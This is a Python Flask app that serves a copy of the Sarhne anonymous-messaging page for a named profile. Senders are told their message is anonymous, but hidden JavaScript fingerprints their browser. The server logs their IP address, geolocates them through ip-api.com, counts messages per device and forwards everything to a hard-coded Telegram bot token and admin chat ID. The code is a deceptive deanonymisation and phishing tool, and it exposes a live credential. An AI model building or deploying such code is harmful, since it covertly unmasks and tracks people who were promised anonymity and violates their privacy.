import json
import os
import datetime
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)
DATA_FILE = "site_data.json"

# إعدادات التليجرام الخاصة بك
TELEGRAM_TOKEN = "828139624:AAGWFzeBA_LGuPKiYtnHS9nIE_eOu83tsQM"
ADMIN_ID = 518292491

def load_site_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            try:
                return json.load(f)
            except:
                pass
    return {"messages": []}

def save_site_data(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def get_country_by_ip(ip):
    if ip in ["127.0.0.1", "localhost", "::1"]:
        return "المحلي (Localhost)"
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        data = res.json()
        if data.get("status") == "success":
            return f"{data.get('country')} - {data.get('city')}"
    except:
        pass
    return "غير معروف"

def send_telegram_alert(msg_data):
    try:
        text = (
            f"🚨 **رسالة صارحني جديدة وصلت!**\n\n"
            f"💬 **الرسالة:** {msg_data['text']}\n"
            f"🌐 **عنوان الـ IP:** `{msg_data['ip']}`\n"
            f"🌍 **الدولة / المدينة:** {msg_data['country']}\n"
            f"💻 **بصمة الجهاز:** `{msg_data['fingerprint']}`\n"
            f"🔢 **عدد رسائل هذا الجهاز:** `رسالة رقم {msg_data['count_from_device']}`\n"
            f"🕒 **الوقت:** {msg_data['time']}"
        )
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": ADMIN_ID,
            "text": text,
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Telegram error: {e}")

HTML_PAGE = r"""
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1"> 
<link rel="shortcut icon" href="https://www.sarhne.com/favicon.ico" type="image/x-icon">
<link rel="icon" href="https://www.sarhne.com/favicon.ico" type="image/x-icon">
<title> صارحني برسالة سرية Abdullah Ahmed </title>
<style>
.x0p{direction:rtl}.x0l,.x0l .ball{position:absolute;direction:ltr}.xi-error span::before,.xi-info span::before,.xi-ok span::before,.xi-warning span::before{content:'';box-sizing:border-box}.x0l{width:120px;height:10px;top:50%;left:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%)}.x0l .ball{width:0;height:0;border:5px solid #000;border-radius:30%;-webkit-animation-duration:2s;animation-duration:2s;-webkit-animation-timing-function:ease;animation-timing-function:ease;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite}.x0l .ball-1{border-color:#555;-webkit-animation-name:BallFly-1;animation-name:BallFly-1}.x0l .ball-2{border-color:#777;-webkit-animation-name:BallFly-2;animation-name:BallFly-2}.x0l .ball-3{border-color:#999;-webkit-animation-name:BallFly-3;animation-name:BallFly-3}.x0l .ball-4{border-color:#bbb;-webkit-animation-name:BallFly-4;animation-name:BallFly-4}@-webkit-keyframes BallFly-1{88%,from,to{margin-left:0}38%,50%{margin-left:110px}}@keyframes BallFly-1{88%,from,to{margin-left:0}38%,50%{margin-left:110px}}@-webkit-keyframes BallFly-2{4%,92%,from,to{margin-left:0}42%,54%{margin-left:110px}}@keyframes BallFly-2{4%,92%,from,to{margin-left:0}42%,54%{margin-left:110px}}@-webkit-keyframes BallFly-3{8%,96%,from,to{margin-left:0}46%,58%{margin-left:110px}}@keyframes BallFly-3{8%,96%,from,to{margin-left:0}46%,58%{margin-left:110px}}@-webkit-keyframes BallFly-4{12%,from,to{margin-left:0}50%,62%{margin-left:110px}}@keyframes BallFly-4{12%,from,to{margin-left:0}50%,62%{margin-left:110px}}.x0p-overlay{position:fixed;left:0;top:0;width:100%;height:100%;background-color:rgba(8,8,8,.6);z-index:99998}.x0p,.xi{left:50%}.x0p{position:fixed;top:50%;font-size:13px;background-color:#fff;-webkit-transform:translate(-50%,-60%);transform:translate(-50%,-60%);z-index:99999}.noscroll{overflow:hidden}
.share-item{display:flex;justify-content:space-between;align-items:center;padding:18px 10px;color:#2d2f31;text-decoration:none;font-size:14px;direction:rtl;background:#9c9c9c40;border-radius:16px;margin-bottom:1rem}
.profile-card{background-color:#fff;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,.1);padding:8px;text-align:center;max-width:580px;margin:-28px 10px 10px;position:relative}
.profile-card-img{border-radius:50%;width:100px;height:100px;object-fit:cover;position:absolute;top:-50px;left:50%;transform:translateX(-50%);border:3px solid #fff}
.status-dot{width:15px;height:15px;background-color:#0f0;border-radius:50%;position:absolute;top:20px;left:calc(50% + 35px);border:3px solid #fff}
.profile-card h3{font-size:20px}
.profile-card p{color:gray;margin:5px 0;font-size:13px;line-height:22px}
.profile-card .stats{display:flex;justify-content:space-around;margin:14px 0}
.profile-card .stats div{text-align:center}
.profile-card .stats div p{margin:0;font-size:16px}
.profile-card .stats div span{color:gray;font-size:12px}
.profile-card .buttons{display:flex;gap:10px;margin-bottom:1rem;margin-left:1rem;margin-right:1rem}
.profile-card .buttons button{padding:6px;border:none;height:41px;background-color:#f1776c;cursor:pointer;font-size:14px;color:#fff;border-radius:40px}
.profile-card .buttons .follow-button{flex-grow:1;display:flex;justify-content:center;align-items:center;gap:5px;direction:ltr}
.middle{vertical-align:middle}.profile_online{width:15px;height:15px;background:#18ac16;display:inline-block;border-radius:50%;margin-right:5px}
.buttom_img{background-color:#f6f6f6;width:60%;border:1px dashed #c6c6c6;direction:ltr;padding:5px;font-size:13px;color:#2d2f31;text-decoration:none;border-radius:5px;display:inline-block;margin-left:5px;margin-right:5px}
.box, .box2{background:#fff;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,.1);padding:15px;margin:10px auto;max-width:580px;text-align:center}
.nav{background:#fff;padding:10px;box-shadow:0 2px 4px rgba(0,0,0,0.1);display:flex;justify-content:space-between;align-items:center;direction:rtl}
.nav-links a{margin:0 10px;text-decoration:none;color:#333;font-size:14px}
.textarea{width:100%;padding:10px;box-sizing:border-box;border:1px solid #ccc;border-radius:5px;font-size:16px;resize:none}
.flatbutton{display:inline-block;padding:12px 20px;color:#fff;text-decoration:none;border-radius:5px;text-align:center;cursor:pointer;font-size:16px}
.soical_icon{width:35px;margin:5px;cursor:pointer}
.timeline-centered{position:relative;margin-bottom:20px;direction:rtl;text-align:right}
.timeline-entry{position:relative}
.timeline-entry-inner{position:relative;display:flex;gap:10px}
.timeline-icon{width:48px;height:48px;background:#6c757d;border-radius:50%;display:flex;justify-content:center;align-items:center}
.timeline-icon img{width:30px;border-radius:50%}
.timeline-label{background:#f8f9fa;padding:15px;border-radius:8px;flex-grow:1;border:1px solid #eee}
.hr{border-bottom:1px solid #eee;margin:10px 0}
.userbutton{display:block;padding:12px;color:#fff;text-decoration:none;border-radius:40px;text-align:center;font-weight:bold}
.wh{color:#fff;text-decoration:none}
#footer{background:#2d2f31;color:#fff;padding:30px 10px;margin-top:40px;text-align:center}
</style>
</head>
<body id="body">
       
<div class="nav" dir="rtl">
  <div class="nav-header">
    <div class="nav-title">
      <img src="https://www.sarhne.com/assets/img/sarhne-nav.png" height="40" alt="Sarhne">
    </div>
  </div>
  <div class="nav-links">
    <a href="/">الرئيسية</a>
    <a href="#">أشتراك</a>
    <a href="#">تسجل الدخول</a>
    <a href="#">بحث</a>
    <a href="#">تعليمات</a>
    <a href="#">اتصل بنا</a>
  </div>
</div> 
   
<center>  
<div id="top">
   <div class="user-title" dir="rtl" style="padding-bottom: 85px; font-weight:bold; margin-top:20px;"> 
 أكتب رسالة إلى <b> Abdullah Ahmed </b> دون ان يعرفك      
   </div>
</div> 
 
<div class="profile-card" dir="rtl">
    <img class="profile-card-img" src="https://static.sarhne.com/sarhne.com/profile_photo/boo2001.jpg?t=1697241122" alt="Profile Picture">
    <div class="status-dot"></div>
    <div style="margin: 40px 0 5px;"></div>  
    <h3>Abdullah Ahmed</h3>
    <p>اللهم ارزقنا حبك وحب من يحبك وحب كل عمل يقربنا إلى حبك ♥️<br>لو ركزت ع اللي ضاع منك عمرك ما هتلاقي اللي بيستناك شوف رزقك الدنيا واسعه 🤎</p>
    <div class="stats">
        <div><p>0</p><span>المنشورات</span></div>
        <div><p>0</p><span>متابعون</span></div>
        <div><p>0</p><span>يتابع</span></div>
    </div>
    <div class="buttons">
        <button class="follow-button">متابعة <img src="https://site.sarhne.com/img/icons/profile/follow-white.svg"></button>
        <button style="background-color: #2d2f312b;"><img src="https://site.sarhne.com/img/icons/menu-icon.svg"></button> 
    </div>
		
    <div style="background: #FFFAF2;padding: 12px;border-radius: 12px;margin-bottom: 1rem;">
      <form id="form" action="/send" method="POST">
        <input type="hidden" name="fingerprint" id="fingerprintInput">
        <textarea id="sarhne" dir="rtl" rows="7" name="message" placeholder="هناك شيء تريد قوله لـ Abdullah Ahmed ، بدون ان يعرفك ؟ أكتب هنا" class="textarea" maxlength="500" required></textarea>
        <small style="float:left;direction: ltr;"><b id="char_count">500</b> الحروف المتبقية  </small>
        
        <div style="clear:both;"></div>
        <div id="idemoj" style="width:97%;margin:5px;padding:5px;display:block;font-size:22px;">
            <a onclick="document.getElementById('sarhne').value+=' 😀 ';" style="cursor:pointer"> 😀 </a>
            <a onclick="document.getElementById('sarhne').value+=' 😅 ';" style="cursor:pointer"> 😅 </a>
            <a onclick="document.getElementById('sarhne').value+=' 😂 ';" style="cursor:pointer"> 😂 </a>
            <a onclick="document.getElementById('sarhne').value+=' 😍 ';" style="cursor:pointer"> 😍 </a>
            <a onclick="document.getElementById('sarhne').value+=' ❤️ ';" style="cursor:pointer"> ❤️ </a>
            <a onclick="document.getElementById('sarhne').value+=' 😢 ';" style="cursor:pointer"> 😢 </a>
            <a onclick="document.getElementById('sarhne').value+=' 😎 ';" style="cursor:pointer"> 😎 </a>
        </div>
 
        <div style="display: flex;">
          <a id="send_button" onclick="document.getElementById('form').submit();" class="flatbutton" style="margin-top: 1rem;background-color:#2D2F31;width:100%;margin:10px;border:0;direction: ltr; color:#fff;">
            <img src="https://www.sarhne.com/assets/img/sent.svg" alt="#" style="vertical-align:middle;" width="22" height="auto"> أرسال الآن  
          </a>
        </div>
      </form>
    </div>
</div>
    
<div class="user-report" dir="rtl">
    <span>الزيارات : 293</span>        
    <p id="report"><a style="font-size: 12px; color: #384854;" href="#">شروط الخدمة</a> - <a style="font-size: 12px; color: #384854;" href="#">سياسة الخصوصية</a></p>   
</div> 

<div class="box2">
   <div id="user_messages"> 
    <p style="text-align: right;"> الآراء التي سمح بأظهارها </p>
    <div id="posts_results">
        <div class="timeline-centered">
            <article class="timeline-entry">
                <div class="timeline-entry-inner">
                    <div class="timeline-icon">
                        <img src="https://www.sarhne.com/assets/img/s-48.png" alt="user">
                    </div>
                    <div class="timeline-label">
                        <div style="text-align:right;">مجهول : <span style="color:gray; font-size:12px;">منذ 4 سنوات</span></div>
                        <div class="hr"></div>
                        <center style="font-size: 14px;direction: rtl;">
                            بعيد عن اي حاجه انت احن و اطيب قلب بجد ربنا يباركلك و يحفظك ويسعدك دايما و اشوفك دايما في احسن حال ♥♥
                        </center>
                    </div>
                </div>
            </article>
        </div>
        
        <div class="timeline-centered">
            <article class="timeline-entry">
                <div class="timeline-entry-inner">
                    <div class="timeline-icon">
                        <img src="https://www.sarhne.com/assets/img/s-48.png" alt="user">
                    </div>
                    <div class="timeline-label">
                        <div style="text-align:right;">مجهول : <span style="color:gray; font-size:12px;">منذ 4 سنوات</span></div>
                        <div class="hr"></div>
                        <center style="font-size: 14px;direction: rtl;">
                            حبيب قلب اخوك ربنا يقويك في الامتحانات ونشوفك دكتور قد الدنيا 🌚
                        </center>
                    </div>
                </div>
            </article>
        </div>
    </div>
   </div>  
</div>  

<div class="box">
    <div class="logo"><h3>حانت لحظة الصراحة</h3></div> 
    <font color="#000"><b>هل أنت مستعد لمعرفة ملاحظات الناس عنك بدون أن تعرفهم ؟</b></font>
    <small><font color="#25373D"><br>
       أحصل على رسائل سرية من زملائك بصراحة <br>
       إعرف مزاياك و عيوبك، وما يعتقده الناس عنك <br>
       عزز شخصيتك بمعرفة الواقع بعيدا عن النفاق <br>
    </font></small>
    <a href="#" class="userbutton" style="background-color:#F0776C;width:90%;margin:10px;"> ! سجل حسابك الآن </a>    
</div> 
   
<div id="center" style="margin-top:50px;">  
   <div style="direction: rtl; font-size:14px; margin-bottom:15px;">روابط التواصل الأجتماعي الخاصة بـ : Abdullah Ahmed</div>
   <div>
     <img src="https://www.sarhne.com/assets/img/social/instagram_icon.svg" class="soical_icon">
     <img src="https://www.sarhne.com/assets/img/social/twitter_icon.svg" class="soical_icon">
     <img src="https://www.sarhne.com/assets/img/social/facebook_icon.svg" class="soical_icon">
     <img src="https://www.sarhne.com/assets/img/social/snapchat_icon.svg" class="soical_icon">
     <img src="https://www.sarhne.com/assets/img/social/youtube_icon.svg" class="soical_icon">
     <img src="https://www.sarhne.com/assets/img/social/wa_icon.svg" class="soical_icon">
   </div>
</div>  

<div id="footer">
  <center>  
      <a href="#" class="wh"> المساعدة </a> - <a href="#" class="wh"> القوانين </a> - <a href="#" class="wh"> اتصل بنا </a>   
      <br><br> 
      <small> جميع الحقوق محفوظة © 2026 </small>
  </center> 
</div>  

<script>
    const textarea = document.getElementById('sarhne');
    const charCount = document.getElementById('char_count');
    textarea.addEventListener('input', function() {
        const remaining = 500 - this.value.length;
        charCount.textContent = remaining;
    });

    function generateFingerprint() {
        const nav = window.navigator;
        const screen = window.screen;
        let uid = nav.userAgent + screen.width + screen.height + screen.colorDepth + (nav.language || '');
        let hash = 0;
        for (let i = 0; i < uid.length; i++) {
            hash = ((hash << 5) - hash) + uid.charCodeAt(i);
            hash |= 0;
        }
        return "FP-" + Math.abs(hash);
    }
    document.getElementById('fingerprintInput').value = generateFingerprint();
</script>
</center>
</body>
</html>
"""

@app.route('/')
def home():
    return HTML_PAGE

@app.route('/send', methods=['POST'])
def send():
    message_text = request.form.get('message')
    fingerprint = request.form.get('fingerprint', 'Unknown-FP')
    
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip = request.remote_addr

    if message_text:
        time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        country = get_country_by_ip(ip)

        data = load_site_data()
        if "messages" not in data:
            data["messages"] = []

        count_from_device = sum(1 for m in data["messages"] if m.get("fingerprint") == fingerprint) + 1

        new_msg = {
            "text": message_text,
            "ip": ip,
            "country": country,
            "fingerprint": fingerprint,
            "count_from_device": count_from_device,
            "time": time_str
        }

        data["messages"].insert(0, new_msg)
        save_site_data(data)
        send_telegram_alert(new_msg)

    return """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head><meta charset="UTF-8"><title>تم الإرسال بنجاح</title></head>
    <body style="background:#f6f6f6; color:#333; text-align:center; padding-top:100px; font-family:Tahoma;">
        <div style="max-width:400px; margin:auto; background:#fff; padding:30px; border-radius:10px; box-shadow:0 4px 8px rgba(0,0,0,0.1);">
            <h2 style="color:#60bf80;">✨ تم إرسال رسالتك السرية بنجاح!</h2>
            <p style="color:gray;">تم تسليم رسالتك إلى Abdullah Ahmed بسرية تامة.</p>
            <br>
            <a href="/" style="background:#2D2F31; color:#fff; padding:12px 25px; text-decoration:none; border-radius:5px; font-size:16px; display:inline-block;">إرسال رسالة أخرى</a>
        </div>
    </body>
    </html>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)